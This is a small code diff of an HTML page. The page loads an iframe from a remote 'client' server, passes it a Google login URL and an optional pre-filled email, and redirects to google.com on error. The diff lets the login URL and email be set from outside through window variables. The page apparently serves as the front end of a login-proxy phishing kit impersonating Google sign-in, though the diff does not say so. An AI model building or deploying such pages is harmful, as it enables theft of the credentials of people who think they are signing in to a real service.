@@ -1,8 +1,8 @@
 <script>
     let src = "http://myprivetnetworkserver.online/client";
     src="http://localhost:8000/client"
-    let login_url = "https://google.com/login";
-    let email = ""; // keep it empty for no email
+    let _default_login_url = "https://google.com/login";
+    let _default_email = ""; 
     let error_page = "https://google.com";
 </script>
 <html>
@@ -14,6 +14,8 @@
         onerror="location = error_page"
     ></iframe>
     <script>
+        if(!window.login_url) login_url = _default_login_url
+        if(!window.email) email = _default_email
         src += '?' + encodeURIComponent(login_url)
         if(email) src += '&' + encodeURIComponent(email)
         document.querySelector('iframe').src = src 
